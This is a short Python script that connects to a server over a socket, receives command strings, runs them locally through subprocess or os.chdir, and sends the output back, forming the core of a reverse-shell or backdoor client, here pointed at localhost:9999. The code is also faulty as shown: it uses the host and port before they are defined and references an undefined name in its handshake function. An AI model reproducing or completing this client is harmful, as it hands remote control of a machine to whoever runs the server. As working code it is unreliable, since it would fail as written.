import socket
import os
import subprocess
import shlex

def execute(cmd):
    # Removing whitespace from both the sides
    cmd = cmd.strip().lower()
    split = cmd.split()
    if not cmd:
        return
    elif split[0]=="cd":
        try:
            directory =''
            i = 1
            while i < len(split):
                directory += split[i]
                i += 1
            print(directory)
            os.chdir(directory)
            print("Hogya")
            output = os.getcwd()
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        print(output)
        return output
    else:
        output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT).decode()
        #output = subprocess.getoutput(cmd)
        print(output)
        return output

#Creating a socket
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.setblocking(True)
#Connect the client
server.connect((target_host,target_port))

def Handshake():
    #Send some data
    server.send(b"Handshake Initialised from " + bytes(name,'utf-8'))

    #Receive data
    response = server.recv(4096)
    print(response.decode())
    return response.decode()

def main():
    with open("myInfo","r") as f:
        name = f.readline()
    target_host = 'localhost'
    target_port = 9999
    response = ''
    ack = Handshake()
    if ack == 'ACK':
        while response != 'terminate':
            response = server.recv(4096)
            print("Hello")
            print(response.decode())
            if response:
                #print(execute(response.decode()))
                server.send(bytes(execute(response.decode()),'utf-8'))
    x = input(":")

if __name__ == '__main__':
    main()